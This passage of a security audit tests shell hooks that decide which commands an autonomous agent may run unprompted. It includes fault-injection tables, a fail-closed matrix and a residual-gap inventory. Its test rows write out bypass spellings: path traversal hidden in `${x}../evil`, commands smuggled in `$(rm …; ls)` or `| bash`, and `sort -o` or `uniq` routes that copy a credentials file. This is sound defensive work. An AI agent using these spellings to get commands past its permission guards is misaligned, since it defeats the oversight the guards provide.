#### Which steps are load-bearing, by fault injection

Four one-line variants of the shipped guards, each run over the whole matrix in the same session, so "this step matters" is a measurement rather than a claim. Direction is shipped → variant.

| Variant | rows that move | direction | what it proves |
|---|---|---|---|
| `hc_clean_piece` before `hc_torn_substitution` | 22 | allow → SILENT | the documented ordering: cleaning peels a legitimate trailing `)` and every balanced `$( … )` piece then reads as torn |
| `hc_piece_is_never_safe` on the **raw** piece | 21 | **SILENT → allow** | the opposite requirement, in the same loop: a split piece keeps its leading space, so `git status && git branch -D <b>` stops parsing as a git command and the deny floor's own forms are granted |
| the trailing-redirect `sed` removed | 3 | allow → SILENT | the strip's whole effect, all in the rewrite guard |
| the same `sed` added to the compounds guard | 1 | SILENT → allow | the divergence between the guards is one shape wide |

The middle row is the one to keep in mind before moving a test across the cleaning call: **the two tests either side of it need opposite states**, and only one of the two failure directions costs a prompt.

#### The zero-piece fall-through, and the two guarantees that make it unreachable

If the split ever produced nothing, the piece loop would run zero tests and fall through to `allow`. Fault-injected — a parser stubbed to print nothing — **129 rows flip SILENT → allow in both guards**, including `rm /etc/hosts`. The library's note on this names one guard; both behave identically, and the note now says so.

What closes it is not the loop but the two producers above it, and both were probed directly rather than read:

- `hc_split_command` is pure parameter expansion with an unconditional final `printf`, so for any non-empty input it emits **at least one** line: measured 1 line for a single statement, whitespace only, a lone continuation and a 2,000-character piece; 2 for one separator, a bare `&&`, tabs and **an invalid UTF-8 byte** — the input on which the `sed` pipeline it replaced could abort. Empty input is the only zero-line case, and its contract is a non-zero return.
- The input cannot be empty by the time it gets there: `hc_payload_fields` returns 1 on an empty `.tool_input.command` and every guard exits on that return. A whitespace-only command survives that test, and is exactly the one-line case above.

#### Residuals recorded, not closed

- **A redirect target outside the workspace rides along on an allowed `rm`** in the rewrite guard, as measured above. Bounded by the same capability already being reachable through the compounds guard on any safe prefix.
- **An unterminated quote before a `-C` directory de-quotes to a valid directory** and the piece is granted: `hc_strip_quotes` peels a leading and a trailing quote independently. Costs nothing — a command with an unterminated quote is a shell syntax error and never runs — and the balanced spellings that could exploit it were measured: a `-C` directory containing a space is refused in both guards, because the remainder then carries the stray quote and matches no prefix.
- **`hc_clean_piece`'s multi-line arm is unreachable from either guard**, as its own comment says, because both loops read a line at a time. It is not dead weight to be removed casually: fed a whole two-line command directly, `hc_matches_any_pattern` **matches** a `cd <repo> *` arm across the newline, so the line-at-a-time read in the callers is what confines the arms, and a future caller that splits differently inherits that obligation.

### 2.2 Expansion-bypass rows

**Who reads this and what for:** anyone touching the two directory rejects in `hc_git_piece_in_workspace` / `hc_runner_piece_in_workspace`, or `hc_torn_substitution`. It answers one question — *which spellings of a directory or a substitution must stay refused, and which leg refuses each one* — because all three tests judge a string the shell has **not expanded yet**, so what they refuse cannot be read off the command's meaning, only off the characters. The library's comment block headed **THE TWO REJECT LINES IN BOTH HELPERS ARE ONE UNIT, AND THE SECOND IS A WHITELIST ON PURPOSE** argues why the whitelist is the only formulation that closes the mechanism and ends with *DO NOT widen the class*; this section is the evidence that argument points at.

**Outcome: every row holds.** Method as §0, on a tree carrying every fix through the configuration cache. Both parsers were rewritten from `sed` pipelines to pure parameter expansion after these rows were first taken, so **every row here was re-driven against the current tree rather than carried over**; none moved. Two runs of the same driver over the same tree produce identical output.

**Composition.** Each row below names a **piece**, judged inside a compound so the guard's own loop is what reaches it. A compounds-guard row is `git status && <piece>`; a rewrite-guard row is `<piece> && rm <repo>/<tracked>`. A piece carrying a `-C` gets `git -C <repo> status &&` in front instead — see the anchor note after the table, which is not a formatting detail. Three rows are their own compound and take no leading piece: E1 and E2, whose separator is the `;` *inside* the substitution, and K13, whose `cd` arm is already a compound. K7 carries a **trailing** piece rather than a leading one — its quoted `-C` is the anchor as well as the directory judged — and is driven in full as `git -C "<repo>" status && ls`; the quoted piece behind an ordinary `git -C <repo> status &&` allows too, but on its own it is SILENT, as an uncompounded statement. Destructive shapes are the benign `rm -r-f` stand-in per §0.

#### Hole rows — every row is SILENT, and no row may ever become `allow`

| # | Piece | guard | leg that refuses it | why that leg and not another |
|---|---|---|---|---|
| A1 | `<runner> --prefix <repo>/${x}../evil <sub>` | compounds | runner whitelist | `$`, `{`, `}` are outside the class; the piece carries no literal `/../` |
| A2 | `<runner> --prefix <repo>/${PWD:0:0}../evil <sub>` | compounds | runner whitelist | same, plus `:` — an expansion that is defined and empty |
| A3 | `<runner> --prefix <repo>/$(:)../evil <sub>` | compounds | runner whitelist | balanced `$( )`, so `hc_torn_substitution` passes it through |
| A4 | ``` <runner> --prefix <repo>/``../evil <sub> ``` (an empty backtick pair) | compounds | runner whitelist | even backtick count, so the torn test passes it through |
| A5 | `<runner> --prefix <repo>/$X/evil <sub>` | compounds | runner whitelist | no `..` in any spelling — the traversal is entirely inside the unexpanded `$X` |
| A6 | `<runner> --prefix <repo>/../evil <sub>` | compounds | literal `/../` reject | ordinary path characters only, so the whitelist admits it |
| B1–B4 | the rewrite-guard twins of A1, A3, A5, A6 | rewrite | as above | the same two helpers serve both allow-only guards |
| C1–C6 | the `git -C <dir> status` twins of A1–A6 | compounds | git whitelist / literal reject | the whitelist is duplicated in both helpers, so each family carries its own rows |
| C7 | `git -C "<repo>"/../evil status` | compounds | literal `/../` reject, then the git whitelist, then `hc_in_workspace` — three independent refusals | `hc_strip_quotes` peels one layer, so the `/../` survives for the literal reject and a stray `"` survives for the whitelist behind it |
| C8 | `git -C "<repo>/../evil" status` | compounds | literal `/../` reject | this spelling de-quotes clean, so the whitelist admits it |
| D1–D2 | the rewrite-guard twins of C1, C3 | rewrite | git whitelist | |
| E1 | `echo $(rm -r-f <dir>; ls)` | compounds | `hc_torn_substitution`, depth leg | the `;` split leaves the piece at depth 1 |
| E2 | `echo $(rm -r-f <dir> $(date); ls)` | compounds | `hc_torn_substitution`, depth leg | the inner closed `$(date)` supplies a `)`; depth still ends at 1 |
| E3–E4 | the rewrite-guard twins of E1, E2 | rewrite | as above | |
| F1 | `` echo ` `` (a lone literal backtick) | compounds | `hc_torn_substitution`, backtick leg | **a disclosed cost**: an odd count is indistinguishable from a fragment |
| F2 | `grep '$(' f.txt` | compounds | `hc_torn_substitution`, depth leg | **a disclosed cost**: the test does not model quoting |
| F3 | `<runner> --prefix <scoped repo>/packages/@acme/storefront <sub>` | compounds | runner whitelist | **a disclosed cost**: `@` is outside the class; §0's scoped fixture |

The three **cost** rows carry the same invariant as the rest of the block, not a softer one. Each is a refusal of something an adopter may legitimately write, and each costs exactly one prompt from an allow-only guard — but a change that turns one of them into an `allow` has widened the character class or weakened the torn test, which is the regression this block exists to catch. Buy a cost back only with a finding that re-runs every row above it.

**The anchor note, which is why the `-C` rows are spelled the way they are.** `git status && git -C <dir> status` is SILENT whenever `<dir>` does not resolve to a repository — which is every `-C` traversal spelling in this block, since none of them names a directory that exists — because `hc_repo_dir_from_command` takes the command's *first* `-C` as the workspace anchor, and an anchor `hc_repo_root` cannot resolve leaves the guard with no workspace and no arms to reach. The quantifier is exactly that and no wider: an unanchored `-C` naming a directory that *does* resolve engages the guard normally, so `git status && git -C <app_dir> status` and `git status && git -C <repo> status` are both `allow`; resolving, not existing, is the criterion, and an existing directory outside any repository is SILENT again. Measured both ways: `git status && git -C <repo>/<absent dir> status` is SILENT, and the same piece behind a leading `git -C <repo> status` is `allow`. A `-C` hole row written without that leading piece therefore proves nothing about any defence, and stays SILENT under **every** fault injection below — the two rows immediately after this note.

#### Anchor controls — SILENT for a different reason, and SILENT under every variant

These two are the naive spellings the note above rules out. They are written in full, with no leading piece, because the absence of one is the point.

| # | Command, in full | guard | what it pins |
|---|---|---|---|
| U1 | `git status && git -C <repo>/<absent dir> status` | compounds | the naive spelling of an ordinary `-C` row — SILENT with no defence involved |
| U2 | `git status && git -C <repo>/${x}../evil status` | compounds | the naive spelling of C1 — same decision as U1, so this spelling distinguishes nothing |

Neither row moves under any variant in the fault-injection table below. That is what makes them controls rather than evidence: a `-C` row written this way would sit in the hole table looking satisfied while measuring no leg at all.

#### Keeper rows — every row is `allow`, and none may go SILENT without a finding

| # | Piece | guard | what it pins |
|---|---|---|---|
| K1 | `<runner> --prefix <app_dir> <configured sub>` | compounds | the ordinary shape the whitelist must not cost |
| K2 | `<runner> --prefix <app_dir> <configured sub, multi-word tail>` | compounds | …and one whose rewrite has to match more than its first two words |
| K3 | `<runner> --prefix "<app_dir>" <configured sub>` | compounds | the whitelist runs **after** the de-quote, so a fully-quoted ordinary directory still passes |
| K4 | `<runner> --prefix <repo>/..foo/<app_dir> <configured sub>` | compounds | an ordinary `..`-prefixed **component** is not a traversal; the literal reject matches `/../` and not `/..foo/` |
| K5–K6 | `git -C` on an ordinary directory, and on `<repo>/..foo` | compounds | the same two properties as K1 and K4 in the other helper — K6 pins the `..`-prefixed component one level down, not K4's deeper path |
| K7 | `git -C "<repo>" status` | compounds | one quote layer peeled before the whitelist |
| K8 | `echo $(date)` | compounds | a balanced substitution is not torn |
| K9 | `sed -E "s/(a\|b)/x/" f.txt` | compounds | a `)` at depth 0 is ignored — a regex group is not a substitution |
| K10–K12 | `rm <repo>/<tracked>` behind a safe `git -C` piece; behind a `--prefix` rewrite; behind an ordinary `-C` rewrite | rewrite | the rewrite guard's arms are live in every row of the block above |
| K13 | `cd <scoped repo>/packages/@acme/storefront && ls` | compounds | the scoped-`appDir` cost is **one prompt on the `--prefix` spelling** (F3) and nothing else: the `cd` arms are unaffected |

#### Which leg produces each SILENT, by fault injection

A row that is SILENT proves nothing on its own — a guard is silent by default. Each variant below is one change to the shipped library, run over the whole row set in the same session; a row that moves only under the variants touching one leg is refused by that leg — the blacklist substitution and the both-lines removal are second forms of the same two removals, not separate legs. Direction is shipped → variant.

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| the whitelist line removed from **both** helpers | 16 — A1–A5, B1–B3, C1–C5, D1–D2, F3 | SILENT → **allow** | every expansion spelling is refused by the whitelist and by nothing else; both families, both guards |
| the historical quote/backslash **blacklist** in its place | the same 16 | SILENT → **allow** | the blacklist is not a weaker whitelist — it misses every one of these, which is why the class is written as an accept list |
| the literal `/../` reject removed from both helpers | 4 — A6, B4, C6, C8 | SILENT → **allow** | the second line does not subsume the first: `.` and `/` are inside the class |
| **both** lines removed | 20 — the union of the two rows above | SILENT → **allow** | no third leg backs either of them up, C7 excepted |
| `hc_torn_substitution` stubbed to "never torn" | 6 — E1–E4, F1, F2 | SILENT → **allow** | the torn test alone produces those six, costs included |
| depth tracking → "does the last `$(` have a `)` after it" | 2 — E2, E4 | SILENT → **allow** | tracking depth, rather than looking for a following `)`, is what catches a nested closed substitution |
| depth tracking → an open/close equality count | 1 — K9 | **allow** → SILENT | ignoring the depth-0 `)` is what keeps an ordinary regex group from stalling a run |

Two readings that only the table makes available. **No keeper row moves under any variant except K9 under the last one** — so the guards were live throughout and the whitelist costs the keepers nothing. And **C7 is the one hole row with three independent refusals**: it does not move even with both reject lines gone, because the stray `"` that survives the one-layer de-quote also breaks `hc_in_workspace`'s `case "$dir" in "$root"/*` containment. Traced at helper level, its de-quoted directory fails all three tests on its own, and the literal `/../` reject is the one that fires — it is the first of the two reject lines in both helpers, above the whitelist. Do not read that third refusal as covering C1–C6.

### 2.3 Fail-closed matrix, with positive controls

**Who reads this and what for:** anyone changing how a guard reaches its configuration — the load, the cache, the jurisdiction test, the protected-branch trichotomy, the payload parse. It answers two questions, and the second is the one an earlier audit of this set could not answer. *When the configuration or the payload cannot be resolved, does any guard permit?* And: *is a guard that answered nothing actually running?* An all-silent table proves neither, because silence is what a guard that crashed, exited at its prefilter or never loaded also produces.

**Outcome: no closed condition permits, and every guard is shown live in the same run.** Method as §0, on a tree carrying every fix through the configuration cache. 108 cells — 14 conditions × 7 probes, plus 10 single-guard configuration gates — 39 of them not silent. Two runs of the driver over the same tree produce identical output, and the control sweep re-taken after every condition reproduces the control sweep taken before them, cell for cell — so nothing below is an artefact of a fixture an earlier row damaged.

**Seven probes for six guards, and why the extra one is not padding.** Each guard is given one command it genuinely answers. `autonomous-protected-branch-guard.sh` gets **two**: a push to a protected branch, which is its positive control, and an **ordinary** push to the non-protected branch the fixture is on. The control alone would be useless as evidence — it denies in every column of the table, so it cannot show the guard *moving* — and the fault injection below moves the ordinary probe while leaving the control's word unchanged. A matrix built from positive controls only would have missed it.

| probe | guard | command (§0's `<repo>`, on `feat_probe`) |
|---|---|---|
| P-ord | `autonomous-protected-branch-guard.sh` | `git -C <repo> push origin feat_probe` |
| P-prot | `autonomous-protected-branch-guard.sh` | `git -C <repo> push origin main` |
| COMMIT | `git-commit-branch-guard.sh` | `git -C <repo> commit -m x` |
| REWRITE | `git-rewrite-branch-guard.sh` | `git -C <repo> status && rm <repo>/<tracked>` |
| ALLOWLIST | `autonomous-script-allowlist-guard.sh` | `bash <repo>/<scripts_dir>/typecheck.sh` |
| COMPOUNDS | `allow-safe-compounds.sh` | `git status && ls` |
| QA | `allow-qa-credentials-read.sh` | `cat <repo>/<credentials_path>` |

REWRITE's probe is a **plain** `rm <tracked>`, per §0: the `rm -r-f` stand-in is a shape that guard refuses outright, so a probe carrying it is silent in every column and that guard ends the run with no positive control at all. That is not hypothetical — it is what happened to one row of §1.4, corrected there in the same commit as this section.

#### The matrix

Cells are the decision; **bold** marks every cell that is not silent, because those are the guards proving they are live. The suffix names the **arm** — `ᵘ` the unresolvable-configuration arm, `ᵖ` the protected-set arm, `ᵈ` the detached-HEAD arm, no suffix the guard's ordinary decision path. `deny` and `denyᵘ` are the same word and different evidence, and a change that swaps one for the other is exactly what this column is for.

| Condition | P-ord | P-prot | COMMIT | REWRITE | ALLOWLIST | COMPOUNDS | QA |
|---|---|---|---|---|---|---|---|
| **control** — valid configuration, ordinary branch | SILENT | **deny** | **allow** | **allow** | **allow** | **allow** | **allow** |
| invalid JSON (`printf 'x' > <config>`) | **denyᵘ** | **denyᵘ** | **askᵘ** | SILENT | SILENT | SILENT | SILENT |
| no `harness.config.json` (moved aside) | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT |
| configuration present but unreadable (`chmod 000`) | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT |
| payload will not parse (`not json at all`) | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT |
| payload will not parse, bytes are a permittable command | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT |
| `defaultBranch` absent from a document that parses | **denyᵘ** | **denyᵘ** | **askᵘ** | SILENT | **allow** | **allow** | **allow** |
| more than one JSON document | **denyᵘ** | **denyᵘ** | **askᵘ** | SILENT | SILENT | SILENT | SILENT |
| `jq` absent from `PATH` | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT |
| `jq` present but older than 1.5 | **denyᵘ** | **denyᵘ** | **askᵘ** | SILENT | SILENT | SILENT | SILENT |
| anchor not inside a git repository | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT | SILENT |
| detached HEAD | SILENT | **deny** | **askᵈ** | SILENT | **allow** | **allow** | **allow** |
| HEAD on a protected branch | **denyᵖ** | **deny** | **askᵖ** | SILENT | **allow** | **allow** | **allow** |
| **control, re-taken** after every row above | SILENT | **deny** | **allow** | **allow** | **allow** | **allow** | **allow** |

**The invariant.** In every row that closes the configuration or the payload — from `invalid JSON` through `anchor not inside a git repository` — **no cell may newly become `allow`, and a cell moving off `deny` or `ask` is a finding**, including a `denyᵘ` that becomes an unsuffixed `deny`. The three cells that already read `allow` inside that span are all in the `defaultBranch` row and are explained by the note below it; they are held to the same rule from the other side, because a guard that never reads the key has no business refusing on it. The rows from `detached HEAD` to the end are not closed conditions at all and carry the opposite obligation: they are where the guards that consult neither `defaultBranch` nor the branch **must keep permitting**, and a cell there moving to `deny` or `ask` is a guard that started nagging outside its jurisdiction. Both spans are named by their endpoint rows rather than by ordinal, so that inserting a row does not silently re-point the sentence.

One row inside that span is closed for a different reason than the rest, and the distinction is the load-bearing one: an **unreadable** configuration is *outside* jurisdiction, not an unresolvable configuration inside it. `hc_config_file_var` tests `[ -f "$f" ] && [ -r "$f" ]` (in `plugin/hooks/lib/harness-config-lib.sh`), so a file the guard's process cannot open never reaches the load, and the row is all-SILENT beside `no harness.config.json` rather than reading `denyᵘ` / `askᵘ` beside `invalid JSON`. The library's trichotomy *does* answer `2` for it — measured directly, `hc_branch_is_protected` returns `2` on a `chmod 000` file — but no guard reaches that call, which is why a library-level reading of this condition and a guard-level one disagree. That silence is a genuine gap in cover for an adopter whose configuration is root-owned or `0600` to another user, and it is stated as such in `plugin/hooks/README.md`'s fail-closed section rather than left for them to discover.

Three rows deserve reading rather than scanning:

- **`defaultBranch` absent is not "the configuration is unreadable".** The document parses; what fails is the *protected set*, so the three guards that consult it refuse and the three that do not go on deciding correctly. `plugin/hooks/README.md`'s fail-closed section listed this condition alongside invalid JSON and said all four allow-only guards fall silent on it; measured, three of them permit, and that sentence is corrected in the same commit as this section. This one was a README-only overstatement; the other two rows below were not, and three published FAIL-CLOSED headers moved with them — `git-commit-branch-guard.sh` no longer lists an absent `jq` as `ask`, and neither it nor `autonomous-protected-branch-guard.sh` (nor that guard's deny reason string) any longer lists an unreadable file as the unresolvable-configuration row. Those are comment and reason-text edits: no cell of this matrix moves under them, which is the check that licensed them.
- **`jq` absent and `jq` too old are opposite rows.** Absent is silence everywhere, including from the deny guard: with no `jq` no guard can parse its payload, so all seven probes exit at the payload gate (`hc_payload_fields "$payload" || exit 0`, in `autonomous-protected-branch-guard.sh`) — which sits above both that guard's jurisdiction test, `hc_config_file "$root" >/dev/null || exit 0`, and `deny()`'s own definition. `deny()` emits its JSON through `jq` too, but that is a second refusal behind the first and is never reached. Too old is refusal everywhere it has jurisdiction, because the load's program is a compile error while `command -v jq` still succeeds. §1.4 measures the second against the pre-cache tree; `README.md` §Prerequisites separates the two for the adopter.
- **The two payload rows differ only in their bytes.** Both are silent here. The second exists because the first cannot distinguish "the parse gate refused" from "the bytes were not permittable anyway" — see the injection table.

#### The single-guard configuration gates

Two guards carry gates no other guard has, and both are presented to the adopter as an opt-out, so a table that only showed them silent would not show that the opt-out *works*. Each is paired with the probe that separates "the gate closed" from "the guard was quiet for some other reason".

| Configuration | Probe | decision |
|---|---|---|
| `scriptsDir` `""` / `"/abs/scripts"` / `"."` / `"../scripts"` | ALLOWLIST's, as above | SILENT (four sub-cases) |
| `scriptsDir` absent | ALLOWLIST's, as above — under the **configured** directory | SILENT |
| `scriptsDir` absent | the same script under the schema default, `<repo>/scripts/typecheck.sh` | **allow** |
| `scriptsDir` configured | `<repo>/scripts/typecheck.sh` | SILENT |
| `phases.qa` false | QA's, as above | SILENT |
| `qa.credentialsPath` unset | QA's, as above | SILENT |
| `qa.credentialsPath` empty | QA's, as above | SILENT |

The middle three are one measurement in three parts: an absent `scriptsDir` is **not** a closed condition, it is the schema default applying, and the only thing that distinguishes the two is where the probe's script sits. Read the first of them alone and the guard looks fail-closed on a key that is merely optional. For the QA guard, the control permits and both gates take it to silence, which is the opt-out `allow-qa-credentials-read.sh`'s header promises under **THE TRADE-OFF THE ADOPTER ACCEPTS**.

#### Which leg produces each SILENT, by fault injection

A silent cell proves nothing on its own. Each variant below is **one** change to the shipped tree, run over the whole 108-cell matrix in the same session; a cell that moves under it is produced by that leg. Direction is shipped → variant.

| Variant | cells that move | direction | what it establishes |
|---|---|---|---|
| `hc_protected_patterns`' two unresolvable legs return the schema default instead of failing | 13 | **P-ord `denyᵘ` → SILENT**, COMMIT `askᵘ` → `allow`, REWRITE SILENT → `allow`; P-prot `denyᵘ` → `deny` | the trichotomy's `2` is the whole fail-closed behaviour of the branch-judging guards, across all four unresolvable rows at once. **P-prot's word does not change** — only its arm — which is why the ordinary-push probe is in the table |
| the multi-document `error(…)` removed from the load's program | 7 | SILENT → **allow** ×4, P-ord `denyᵘ` → SILENT, COMMIT `askᵘ` → `allow`, P-prot `denyᵘ` → `deny` | the entire multi-document row is produced by that one `error` and by nothing else: with it gone every cell returns to its control value. This is the row no other row protects |
| a failed load treated as an empty document that parsed | 3 | SILENT → **allow**, COMPOUNDS only, in the three "document present, will not resolve" rows | only the compounds guard's silence there rests on the load's failure alone. The other three allow-only guards have a second refusal behind it (an unusable `scriptsDir` default, an unset credentials path, the trichotomy) and do not move |
| the jurisdiction test (`[ -f ] && [ -r ]`) removed | 6 | SILENT → **denyᵘ** ×2, SILENT → **askᵘ**, in the `no harness.config.json` row **and** the unreadable one | both rows' silence is the jurisdiction decision, not the load: a repository that never adopted the harness is one line away from being refused in — and the unreadable row moving under exactly this variant, and no other, is what places it outside jurisdiction rather than inside it |
| `hc_have_jq` stubbed to always succeed | 0 | — | the `jq`-absent row is not held up by that gate. Every guard parses its payload through `jq` first and exits on the failure, so the row is a double refusal |
| every guard's `hc_payload_fields … \|\| exit 0` opened, the raw payload used as the command | 1 | SILENT → **allow**, the permittable-bytes payload row, COMPOUNDS | the payload-parse gate is the only thing between an unparseable payload and a decision. The *other* payload row does not move, which is why both are in the table: unparseable bytes that are not a command prove nothing about the gate |

Two readings the table makes available and the cells alone do not. **No control cell moves under any variant** — the guards were live throughout, and every movement above is a closed cell opening rather than a working guard breaking. And the first variant is the shape of the regression this section exists to catch: it is one plausible "simplify the trichotomy" edit, it makes an ordinary push on a feature branch silently permitted again, and **the positive control keeps saying `deny` while it happens**.

#### Decision identity across the configuration cache

The same 108 cells run against the pre-cache guard set described at the end of §0 differ in **12**, and all 12 sit in the two rows the cache deliberately introduced: seven in `jq` older than 1.5 and five in more than one JSON document. Every other row — invalid JSON, no configuration, an unreadable configuration, both payload rows, `defaultBranch` absent, `jq` absent, not a repository, detached HEAD, protected HEAD, the single-guard gates, and both control sweeps — is **identical** between the two trees. That is the fail-closed half of the decision-identity evidence for the cache refactor, which §1's timing tables cannot carry, and it is what bounds the refactor's behavioural change to the two conditions §1.4 documents.

#### What this section does not cover

- **A permission profile is not modelled.** Every `SILENT` here means "this guard said nothing"; what the adopter's session then does with the command is the profile's decision, and the argument that silence costs a prompt rather than a permit is structural (four of the guards emit only `allow`), not measured here.
- **The cache's process boundary.** `HC_CFG_*` inherited from another process is refused by the pid test rather than by any row above; it is a property of the load, and `lib/harness-config-lib.sh` documents it under the memo-this-process-did-not-write note.
- **Concurrent mutation.** Every row rewrites the configuration between cells, never during one. A file rewritten *while* a guard reads it is out of scope for this matrix and for the cache's stated staleness boundary.

### 2.4 Disclosed residuals, re-confirmed

**Who reads this and what for:** anyone about to re-litigate a known gap — a contributor who has just hit one of the "recorded, not closed" notes in the library or a guard header, or a reviewer asking whether a shape reported once is still open. It answers one question: *which disclosed shapes are still open, what bounds each, and which have since been closed?* Each note argues its own case at the point a contributor is reading it, which is where the argument belongs; what none of them can carry is the **standing status of the set**. A residual list with no home goes stale in both directions — a shape that was closed keeps being described as open, and one that is still open stops being re-measured — and both had happened by the time this section was written.

**Outcome: nine open, three closed, and one gap that is not a residual at all.** Rows `h`, `i`, `j`, `k` and `l` were all added later — `h` with the bare-`&` separator, `i` with the credentials guard's read-command narrowing, `j` and `k` with the two header corrections that disclosed them — and the figures in the rest of this paragraph are the original round's and cover rows `a`–`g`. Method as §0, on a tree carrying both parser rewrites and the configuration cache. 36 rows across the two allow-only guards and the deny guard, plus four fault injections and one cwd sweep. Every row was **re-measured against the current tree rather than carried over** — the parsers and the cache all landed after these shapes were first reported — and one measurement below contradicts the shape as it was originally reported. Two runs of the driver are identical, and the fixture configuration was verified byte-identical to its pristine copy afterwards.

**Fixtures**: §0's primary and scoped repositories, plus two additions this round needs. A **symlink inside the primary pointing at a directory outside the workspace** (`<link>` → `<outside>`, an ordinary directory in neither repository), which is residual (a)'s whole subject and also supplies the redirect target for (d). And, for one row of (c), a **process working directory in which `refs/heads/*` matches an ordinary branch name and nothing protected** — that guard's `set -f` defence is invisible from a directory where the glob matches nothing, which is most of them.

#### The inventory

Status is the standing answer. "Cost" means a refusal an adopter may legitimately run into — one prompt from an allow-only guard, never a permit; "capability" means something the set does not refuse.

| # | Shape | Kind | Status | Bound, as measured | Where the argument lives |
|---|---|---|---|---|---|
| a | An in-workspace path that is a **symlink out** is accepted by the two rewrite helpers | capability | **OPEN** | Grants nothing beyond in-repo write access, which already reaches the same execution through the configured `depInstall` (rows a1–a7) | `lib/harness-config-lib.sh`, **ONE RESIDUAL, RECORDED SO IT IS NOT RE-LITIGATED: A SYMLINK** |
| b | A configured `appDir` carrying a character outside the path class (a scoped `packages/@acme/…`) loses the `--prefix`-with-a-subcommand spelling | cost | **OPEN** | Exactly that one spelling, in **both** allow-only guards; the tail-free `--prefix` arm, the `cd` arms and every bare configured command are untouched (rows b1–b7) | same file, the cost sentence in **THE TWO REJECT LINES IN BOTH HELPERS ARE ONE UNIT**; the refusal itself is §2.2's F3 |
| c | `git push <remote> refs/heads/*` and its sibling set spellings | capability | **CLOSED** | Six spellings refused, by three different arms; see the arm column of rows c1–c6 | `autonomous-protected-branch-guard.sh`, header condition (c) and the arms named below |
| d | A **redirect target** outside the workspace rides along on an `rm` the rewrite guard allows | capability | **OPEN** | The identical capability is reachable through `allow-safe-compounds.sh` on **every** safe prefix the configuration resolves — measured, not asserted (rows d1–d8) | `git-rewrite-branch-guard.sh`, **A TRAILING REDIRECT IS STRIPPED BEFORE A PIECE IS MATCHED**; §2.1's redirect subsection |
| e | An **unterminated quote** before a `-C` directory de-quotes to a valid directory and the piece is granted | capability | **OPEN** | Costs nothing: such a command is a shell syntax error and never runs, and the balanced spelling that could exploit it (a directory containing a space) is refused (rows e1–e3) | §2.1's residual list |
| f | The torn-substitution test refuses a **lone backtick** and a **quoted `$(`** | cost | **OPEN** | One prompt each, from an allow-only guard; the test does not model quoting and an odd backtick count is indistinguishable from a fragment (rows e4–e5) | §2.2's F1 / F2, and the cost paragraph under that block |
| g | `hc_clean_piece`'s multi-line arm is unreachable from either guard | obligation | **OPEN** | No decision of its own. It is what confines the `cd` arms to one line, so a future caller that splits differently inherits the obligation | §2.1's residual list |
| h | **The split reads no quoting**, so a separator byte inside a quoted argument — `git commit -m "a & b"`, `"a ; b"` — cuts the piece mid-argument and the trailing fragment matches no prefix | cost | **OPEN** | One prompt from an allow-only guard, never a permit; a quote-aware split would fail in the other direction, handing back an allow on text the parser cannot read. Pre-existing for `;` / `&&` / `\|\|`; the bare `&` added one byte to the class. Measured as one row per allow-only guard in §3.1's bare-`&` block | `harness-config-lib.sh`, **QUOTING IS NOT READ, FOR THIS SEPARATOR OR ANY OTHER** |
| i | The credentials guard's `CREDS_READ_COMMANDS` carried `sort` and `uniq`, so `sort -o <out>` / `--output=<out>`, `sort -o <creds> <creds>` and `uniq <creds> <out>` auto-allowed a second cleartext copy of the credentials file — the capability `cp`, `tee`, `dd` and `truncate` are refused tokens to withhold | capability | **CLOSED** | Closed by **two arms, and the first alone was not enough**. The two entries came off the constant, which refuses the four command-position spellings (i1–i4) and nothing else; `cat <creds> \| sort -o <out>` was still measured **allow** on that arm (i11–i13), because a piece test cannot reach a tail. The two names are therefore also on the **whole-string refused-token scan**, where `cp`, `tee`, `dd` and `truncate` are refused (i14 is that comparison as a control). Cost: `cat <creds> \| sort` / `\| uniq` and any compound naming the file that also names either binary (i15–i17); the read surface the corpus spells does not move (i5–i9), and neither does a command that names no configured basename (i18) | `allow-qa-credentials-read.sh`, the comment above `CREDS_READ_COMMANDS` and `THE REFUSED TOKENS`; the spellings are NO-OUTPUT rows of that guard's REPRO block, and §3.1's N87–N92 carry the second arm |
| j | A **pipe** or a balanced **`$(…)`** appended to a permitted wrapper invocation rides along on the script-allowlist guard's allow — `bash <scripts dir>/<wrapper>.sh \| bash`, `… $(rm …)` | capability | **CLOSED** | Closed by the **construct scan**: a whole-string `case` over `$(`, a backtick, `\|` and `<`, plus **two shape walks** — one admitting a bare `${IDENT}` and refusing every other braced form, one admitting a `>` only as a descriptor duplication or as a redirection to the literal `/dev/null` and refusing every other, a FILE destination above all — run before the repository is resolved. Not by teaching the split to read those bytes — the split still reads `&&`, `\|\|`, `;` and a bare `&`. Cost, **partly bought back and only partly**: the redirection half — `&>`, `2>&1` and the `/dev/null` destinations — is closed by the `>` walk (§3.3's W23–W24, and §3.1's N102 superseded with them), while `\|\|` is **still OPEN** with its bound unchanged — a superstring of the scanned `\|`, so a `\|\|` compound still never reaches the split, and buying it back still means scanning a pipe that is not `\|\|` (rows j1–j8, and §3.1's N93–N107) | `autonomous-script-allowlist-guard.sh`, **THE CONSTRUCT SCAN — THE SHELL'S COMPOSITION GRAMMAR, NOT A VOCABULARY OF BINARIES** |
| k | The same two shapes on the credentials guard — `cat <creds path> $(git push …)`, `echo "$(git push …) <creds path>"` | capability | **OPEN** | The whole-string token scan, which catches a refused token in either tail and nothing else: the residual is exactly what the token list does not name — a set **two binaries smaller** since `sort` and `uniq` joined the list, which is what keeps a tail that writes a second cleartext copy out of it (rows k1–k8, and (i)'s i11–i13) | `allow-qa-credentials-read.sh`, **EVERY PIECE, BUT EACH JUDGED BY ITS LEADING WORDS** |
